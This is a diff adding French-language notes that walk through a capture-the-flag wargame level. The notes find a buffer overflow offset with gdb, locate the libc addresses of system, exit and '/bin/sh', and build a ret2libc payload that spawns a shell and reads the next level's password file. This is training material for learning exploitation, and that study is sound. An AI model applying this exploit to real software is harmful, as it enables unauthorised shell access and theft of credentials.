@@ -1,0 +1,59 @@
+idee : overflow et ret2libc simple
+ret2libc : https://beta.hackndo.com/retour-a-la-libc/
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+
+Breakpoint 1, 0x0804848b in verify_user_name ()
+i r
+(gdb) x/30s 0x80486a8
+0x80486a8:	 "dat_wil" → username
+0x80486b0:	 "admin"  → password
+
+segfault sur le mdp : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+demsg → [ 5814.267735] level01[2032]: segfault at 41414141
+
+recherche de l’overflow : 
+
+a partir de 73 charactere :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA → pas de segfault
+
+a partir de 78 charactere :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA → pas de segfault
+
+a partir de 82 charactere :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA → segfault
+
+a partir de 81 charactere :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA → segfault
+
+a partir de 80 charactere :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA → segfault
+
+a partir de 79 charactere :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA →pas de segfault
+
+
+offset = 80 → 80 + address system + 4bytes (address exit) + address /bin/bash
+
+Trouver l’adress de /bin/bash dans la libc
+https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb
+info proc mapping
+find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x.f7.e6.ae.d0 <system>
+
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x.f7.e5.eb.70 <exit>
+
+return address de 
+
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+(gdb) x /xg 0x.f7.f8.97.ec 
+0xf7f897ec:	0x00.68.73.2f.6e.69.62.2f
+
+
+(python -c "print 'dat_wil'"; python -c "print 'A'*80 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level01
+cat /home/users/level02/.pass
